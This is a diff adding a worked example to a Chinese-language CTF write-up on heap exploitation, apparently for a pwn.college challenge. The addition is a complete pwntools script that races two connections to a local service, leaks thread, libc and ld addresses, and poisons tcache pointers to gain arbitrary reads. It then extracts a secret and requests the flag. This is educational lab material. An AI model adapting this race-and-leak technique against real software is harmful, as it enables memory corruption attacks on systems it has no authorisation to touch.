@@ -112,6 +112,101 @@ p.interactive()
 **核心思路是得知libc的地址后，可以在ld中搜索指向thread stack内存映射区域的指针，ld和libc的内存映射是相邻的！！！**<br>
 `p2p  search_mmap_region target_mmap_region`<br>
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250524235643.png)
+这里给个例子：<br>
+```python
+import os
+from pwn import *
+
+binary_path = "/challenge/babyprime_level3.0"
+#binary_path = './babyprime_level3.0'
+p = process(binary_path)
+r1 = remote("127.0.0.1",1337)
+r2 = remote("127.0.0.1",1337)
+
+idx = 0
+def leak_pthread_addr(r1,r2):
+    global idx
+    while True:
+        if os.fork() == 0:
+            for _ in range(10000):
+                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
+            os.kill(os.getpid(),9)
+        for _ in range(10000):
+            r2.sendline(b"printf %d"%(idx))
+        os.wait()
+        r1.clean()
+        try:
+            output = r2.clean()
+            output = set(output.split(b'\n'))
+            print(output)
+            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
+            print(leak)
+            leak = u64(leak[9:17])
+            break
+        except Exception as e:
+            print(f"error: {e}")
+            print("try leak pthread_addr again")
+    idx += 1
+    return leak
+# 相比之前能快速提高命中率！
+def arbitrary_read(r1,r2,addr):
+    global idx
+    r1.clean()
+    r2.clean()
+    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
+    while True: 
+        if os.fork() == 0:
+            for _ in range(2000):
+                r1.sendline(b"malloc %d free %d"%(idx,idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
+        os.wait()
+        r1.sendline(b"malloc %d"% idx)
+        r1.sendline(b"printf %d"% idx)
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        #print("output:",output)
+        target = p64(addr).split(b"\x00")[0]
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.sendline(b"printf %d" %(idx+1))
+    r1.recvuntil(b"MESSAGE: ")
+    output = r1.recvline().strip(b"\n")
+    idx += 2
+    return output
+
+
+gdb.attach(p,"continue\n")
+pause()
+pthread_addr = leak_pthread_addr(r1,r2)<<12
+log.success(f"pthread_addr: {hex(pthread_addr)}")
+libc_addr_ptr = pthread_addr + 0x8a0
+
+libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
+log.success(f"libc_addr: {libc_addr}")
+libc_addr = u64(libc_addr.ljust(8,b"\x00"))
+log.success(f"libc_addr: {hex(libc_addr)}")
+ld_addr = libc_addr + 0x10380
+log.success(f"ld_base: {hex(ld_addr)}")
+pthread_stack_ptr = ld_addr + 0x3b0b0
+log.success(f"pthread_stack_ptr: {hex(pthread_stack_ptr)}")
+
+thread_stack_addr = arbitrary_read(r1,r2, pthread_stack_ptr^((pthread_addr+0x1000)>>12))
+thread_stack_addr = u64(thread_stack_addr.ljust(8,b"\x00"))-0x28f0
+log.success(f"thread_stack_addr: {hex(thread_stack_addr)}")
+#context.log_level='debug'
+secret = arbitrary_read(r1,r2,thread_stack_addr^((pthread_addr+0x2000)>>12))
+log.success(f"secret: {secret}")
+
+r1.clean()
+r1.sendline(b"send_flag")
+r1.recvuntil(b"Secret: ")
+r1.sendline(secret)
+output = r1.clean()
+print(output)
+p.interactive()
+```
 
 # 2. arbitrary write<br>
 
